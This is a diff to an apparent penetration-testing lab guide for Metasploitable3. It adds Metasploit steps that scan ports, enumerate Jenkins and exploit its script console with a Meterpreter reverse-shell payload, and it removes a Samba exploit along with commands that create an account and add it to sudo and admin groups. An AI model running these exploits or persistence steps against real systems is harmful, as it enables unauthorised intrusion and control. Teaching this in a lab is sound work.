@@ -165,55 +165,70 @@ Use this tool to search for the specific types of exploits you want to launch ag
 `grep exploit search service_type`
 
 
-### Exploit
+### Investigating Open Ports
 
-This is the samba exploit you can launch against the metasploitable linux server
+`use auxiliary/scanner/http/http_version`
 
-`use exploit/multi/samba/usermap_script`
+`set RPORT 9200`
+
+`run`
+
+What was the result?
+
+What things use port 9200? Elastic search 
+
+`set RPORT 8484`
+
+`run`
+
+What was the result?
+
+What things use port 8484? Jenkins
+
+`set RPORT 8585`
+
+`run`
+
+What was the result?
+
+What things use port 8585? WAMP is Windows, Apache, MySQL, and PHP
+
+### Probe system for Jenkin information
+
+`use auxiliary/scanner/http/jenkins_enum`
+
+`set RPORT 8484`
+
+`set TARGETURI /`
+
+`run`
+
+### Exploit Jenkins on Metasploitable3
 
 This is the command you use to set the host you are going to run the exploit against once you locate it on your network
 
 `set rhosts xxx.xx.xxx.xxx`
 
+`use exploit/multi/http/jenkins_script_console`
+
+`set RPORT 8484`
+
+`set TARGETURI /`
+
+`set RHOST xxx.xxx.xxxx.xxx` (This is the IP of your target)
+
+`set PAYLOAD windows/meterpreter/reverse_tcp'
+
 Starts the exploit against the system you specified with the set rhost command.
 
-`run`
+`exploit`
 
-Is the access you have when you have successful executed the exploit against the vulnerable system.
-
-`reverse shell`
+If your exploit is successful you should get a meterpreter prompt where you can run remote commands on the Windows host.
 
 ### Create, Elevate & Gain access
 
-Create an account on the system via reverse shell
 
-`useradd username`
-
-Change the password on the account you just created
-
-`passwd username`
-
-Process of granting privileges to a known or created account to gain root level access to system
-
-### Elevate Privileges
-
-Add the account to the sudo group
-
-`usermod -a -G sudo username`
-
-Add the account to the admin group
-
-`usermod -a -G admin username`
-
-Connect & Elevate Access
-
-Connect to a remote or local system via ssh with a named account that you know the password to
-
-`ssh username@xxx.xxx.xxx.xxx`
-
-Run a command with root or elevated privileges example: “sudo passwd username” changes the password of an account
-
-`sudo command-name`
+Connect to a remote or local system via rdp with a named account that you know the password to
 
 ### Now What?
 
